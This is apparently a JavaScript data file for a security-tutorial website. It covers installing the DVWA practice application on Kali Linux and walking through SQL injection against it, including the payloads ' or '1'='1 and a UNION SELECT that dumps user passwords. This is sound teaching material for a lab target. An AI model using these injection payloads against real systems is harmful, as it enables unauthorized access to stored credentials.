import codeimg1 from '../../Data/Sql_Injection/DVWAimg/codeimg1.png';
import codeimg2 from '../../Data/Sql_Injection/DVWAimg/codeimg2.png';
import id2img from '../../Data/Sql_Injection/DVWAimg/id2img.png';

const sqlInjectionData = [
    {
        id: 1,
        title: "Installation DVWA in Kali Linux",
        description: "Damn Vulnerable Web Application, shorter DVWA, is a PHP/MySQL web application that is damn vulnerable. The main goal of this pentesting playground is to aid penetration testers and security professionals to test their skills and tools. In addition it can aid web devs better understand how to secure web apps, but also to aid students/teachers to learn all about web app security and possible vulnerabilities.",
        despoints: [],
        pointsTitle: "Steps to Install DVWA :",
        points: [
            '1: Open terminal and give root Permission <span class="text-purple-500">sudo apt update -y && sudo apt upgrade -y </span>.',
            '2: Open terminal and write this code <span class="text-purple-500"> sudo apt install docker.io </span>. for docker instatiation.',
            '3: Open terminal and write Below Commands.',
        ],
        code: [
            {
                title: '',
                code: 'git clone https://github.com/eystsen/pentestlab.git',
                codeimgs: []
            },
            {
                title: '',
                code: 'cd pentestlab',
                codeimgs: []
            },
            {
                title: 'Its show available pentest applications',
                code: './pentestlab.sh list',
                codeimgs: []
            },
            {
                title: '',
                code: './pentestlab.sh start dvwa',
                codeimgs: []
            },
            {
                title: 'After Installating dvwa, open your browser and open this.',
                code: ' http://127.8.0.1',
                codeimgs: []
            },
            {
                title: 'The Default username and password is ',
                code: 'admin | password',
                codeimgs: []
            }
        ],
        note: 'Note:- When you Successfully login then Scroll down and one button will be Must click. its Create/reset database. Then You again login.',
        subdesc: 'Now Its Successfully, in storming into your kali linux. when you need to use this Open browser and. write thsi url :- http://127.8.0.1 ',
        images: [
            // {
            //     src: "path_to_image_2.jpg",
            //     alt: "Description of Image 2"
            // }
        ]
    },

    {
        id: 2,
        title: "SQL Injection With DVWA",
        description: "SQL Injection is a vulnerability that allows attackers to manipulate SQL queries executed by a web application. This can lead to unauthorized access, data leaks, and other security issues. Below are some common SQL Injection tricks and techniques",
        despoints: [],
        pointsTitle: "Steps to Perform SQL Injection with DVWA :",

        points: [
            '1: Go to the Sql Injection Option. and you can see <span class="text-[#A1CC33] rounded-md bg-[#2f2f2f] p-1"> the Vulnerability: SQL Injection </span>',
            '2: Enter User ID: 1 in the input field. its give the some information. [ First name: Gordon Surname: Brown ]',
            '3: Then you have Run SQL injection. View source code button.',
        ],
        code: [
            {
                title: `Now Enter this 1 ' or '1' = '1  input Field Looks like this USER ID: <span class="text-black rounded-md px-2 py-1 bg-gray-200">1 ' or '1' = '1 </span>`,
                code: `Query looks: - SELECT first_name, last_name FROM users WHERE user_id = '1' or '1' = '1';`,
                codeimgs: [
                    {
                        src: codeimg1,
                        alt: "Example 1: SQL Injection with '1' OR '1' = '1"
                    }
                ]
            },
            {
                title: `Now Enter this ' UNION SELECT user , password FROM users# input Field Looks like this USER ID: <span class="text-black rounded-md px-2 py-1 bg-gray-200">' UNION SELECT user , password FROM users# </span>`,
                code: `Query looks: - SELECT first_name, last_name FROM users WHERE user_id = ' UNION SELECT user , password FROM users# '; `,
                codeimgs: [
                    {
                        src: codeimg2,
                        alt: "Example 1: SQL Injection with '1' OR '1' = '1"
                    }
                ]
            },
        ],
        note: 'NOTE: This is Low Level security you can update the security level and perfoem Sql injection queries.',
        subdesc: 'This Image represents the security level change setting page.',
        images: [
            {
                src: id2img,
                alt: "DVWA Security Level settings. LOW , HIGH , etc."
            },
        ]

    },


];

export default sqlInjectionData;
